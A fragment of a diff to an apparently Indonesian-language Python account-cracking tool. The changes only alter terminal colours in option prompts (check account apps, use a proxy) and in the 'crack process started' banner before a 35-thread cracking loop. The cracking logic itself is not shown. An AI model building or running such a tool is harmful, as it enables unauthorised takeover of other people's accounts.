     if tanya_cek_opsi in ['1','y']:pilih_cek_opsi = True
     else:pilih_cek_opsi = False
-    print('   %s[%s•%s] %sCek APK Akun %sOK %s?'%(K,P,K,P,H,P))
-    tanya_cek_apk = input('     %s└─> %s[%sy%s/%st%s] %s: %s'%(A,H,A,P,A,H,P,H)).lower()
+    print('   %s[%s•%s] %sCek APK Akun %sOK %s?'%(O,P,O,P,H,P))
+    tanya_cek_apk = input('     %s└─> %s[%sy%s/%st%s] %s: %s'%(A,J,A,P,A,J,P,J)).lower()
     if tanya_cek_apk in ['1','y']:pilih_cek_apk = True
     else:pilih_cek_apk = False
-    print('   %s[%s•%s] %sGunakan %sProxy %s?'%(Z,P,Z,P,O,P))
-    tanya_proxy = input('     %s└─> %s[%sy%s/%st%s] %s: %s'%(A,H,A,P,A,H,P,H)).lower()
+    print('   %s[%s•%s] %sGunakan %sProxy %s?'%(H,P,H,P,O,P))
+    tanya_proxy = input('     %s└─> %s[%sy%s/%st%s] %s: %s'%(A,J,A,P,A,J,P,J)).lower()
     if tanya_proxy in ['1','y']:pilih_proxy = True
     else:pilih_proxy = False
 
@@ -1564,7 +1356,7 @@ class crack:
                 try:
                     self.sementara.append(dvt)
                 except Exception as e:continue
-        print('\n%s───────────────%s[ %sProses Crack Dimulai %s]%s───────────────\n'%(P,J,P,J,P))
+        print('\n%s───────────────%s[ %sProses Crack Dimulai %s]%s───────────────\n'%(P,H,P,H,P))
         self.Mulai_Jalan = datetime.now()
         with ThreadPoolExecutor(max_workers=35) as qwerty:
             for dvt in self.sementara:
